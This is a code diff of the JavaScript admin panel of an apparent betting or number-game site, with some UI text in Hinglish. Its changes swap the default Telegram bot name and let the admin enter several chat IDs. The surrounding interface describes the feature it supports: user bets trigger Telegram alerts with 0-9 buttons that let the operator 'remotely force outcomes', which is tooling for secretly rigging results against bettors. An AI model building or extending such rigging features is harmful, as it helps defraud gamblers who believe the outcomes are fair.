@@ -719,7 +719,7 @@ function renderOutcomesView(container) {
                             When enabled, user bets trigger instant Telegram alerts with 0-9 buttons to remotely force outcomes.
                         </div>
                         <div style="font-size: 9.5px; color: #94a3b8; margin-top: 4px; display: flex; align-items: center; gap: 6px; flex-wrap: wrap;">
-                            <span>📱 <b>Bot:</b> <code>@${(telegramConfigState && telegramConfigState.botUsername) || 'smarty91_alert_bot'}</code></span>
+                            <span>📱 <b>Bot:</b> <code>@${(telegramConfigState && telegramConfigState.botUsername) || 'smarty91_ops_v9bot'}</code></span>
                             <span>•</span>
                             <span>🎯 <b>Active Target:</b> <code>${(telegramConfigState && telegramConfigState.chatId) || '8282793854'}</code> (${((telegramConfigState && telegramConfigState.chatId) || '').startsWith('-100') ? 'Channel' : 'Chat'})</span>
                         </div>
@@ -986,7 +986,7 @@ function renderOutcomesView(container) {
             try {
                 const res = await adminService.sendTelegramTest();
                 if (res && res.success) {
-                    alert(`✅ Test Alert Sent Successfully!\n\nTarget: ${res.chatId || 'Chat/Channel'}\nMessage ID: ${res.result ? res.result.message_id : 'Delivered'}\n\n👉 Apne Telegram par check karein: Agar personal chat hai to @smarty91_alert_bot par aaya hoga, ya fir configured channel me!`);
+                    alert(`✅ Test Alert Sent Successfully!\n\nTarget: ${res.chatId || 'Chat/Channel'}\nMessage ID: ${res.result ? res.result.message_id : 'Delivered'}\n\n👉 Apne Telegram par check karein: Agar personal chat hai to @${res.botUsername || 'smarty91_ops_v9bot'} par aaya hoga, ya fir configured channel me!`);
                 } else {
                     alert(`❌ Failed to send test alert: ${res ? res.message : 'Unknown error'}`);
                 }
@@ -1004,7 +1004,7 @@ function renderOutcomesView(container) {
     if (configTgBtn) {
         configTgBtn.addEventListener('click', async () => {
             const currentChatId = prompt(
-                "Enter Telegram Target Chat ID or Channel ID:\n\n• For Personal DM: Enter your numeric User ID (e.g. 8282793854) and start @smarty91_alert_bot.\n• For Channel: Add @smarty91_alert_bot as ADMIN to your channel and enter channel ID (e.g. -100xxxxxxxxxx or @channelname).",
+                "Enter Telegram Target Chat ID or Channel ID:\n\n• For Personal DM: Enter numeric User ID (or comma separated IDs for multi-device e.g. 8282793854, 12345678) and start @smarty91_ops_v9bot.\n• For Channel/Group: Add @smarty91_ops_v9bot as ADMIN to your group/channel and enter ID (e.g. -100xxxxxxxxxx).",
                 "8282793854"
             );
             if (!currentChatId || !currentChatId.trim()) return;
@@ -1481,7 +1481,7 @@ function renderCashierView(container) {
 
             <!-- Telegram Bot Status & Direct Control Center -->
             ${(() => {
-                const curBotName = (telegramConfigState && telegramConfigState.botUsername) || 'smarty91_alert_bot';
+                const curBotName = (telegramConfigState && telegramConfigState.botUsername) || 'smarty91_ops_v9bot';
                 const curChatId = (telegramConfigState && telegramConfigState.chatId) || '8282793854';
                 const isChan = curChatId.startsWith('-100') || curChatId.startsWith('@');
                 return `
@@ -1783,10 +1783,10 @@ function renderCashierView(container) {
                     tgFeedback.style.border = '1px solid rgba(16, 185, 129, 0.3)';
                     tgFeedback.innerHTML = `✅ <strong>Test Alert Sent Successfully!</strong><br/>
                     • <b>Delivered to Target ID:</b> <code>${res.targetChatId || (telegramConfigState && telegramConfigState.chatId) || 'Configured ID'}</code><br/>
-                    • <b>Sent via Bot:</b> @${res.botUsername || 'smarty91_alert_bot'}<br/>
+                    • <b>Sent via Bot:</b> @${res.botUsername || 'smarty91_ops_v9bot'}<br/>
                     <div style="margin-top: 6px; font-size: 11px; color: #cbd5e1; font-weight: normal;">
                         👉 <b>Agar aapko notification nahi mila:</b><br/>
-                        Iska matlab aapka real Telegram Chat ID upar wale Target ID se match nahi karta! <a href="https://t.me/${res.botUsername || 'smarty91_alert_bot'}?start=admin_9876544" target="_blank" style="color: #38bdf8; font-weight: bold; text-decoration: underline;">Yahan click karke bot me START dabayein</a>, aapka account automatic link ho jayega.
+                        Iska matlab aapka real Telegram Chat ID upar wale Target ID se match nahi karta! <a href="https://t.me/${res.botUsername || 'smarty91_ops_v9bot'}?start=admin_9876544" target="_blank" style="color: #38bdf8; font-weight: bold; text-decoration: underline;">Yahan click karke bot me START dabayein</a>, aapka account automatic link ho jayega.
                     </div>`;
                 }
             } catch (err) {
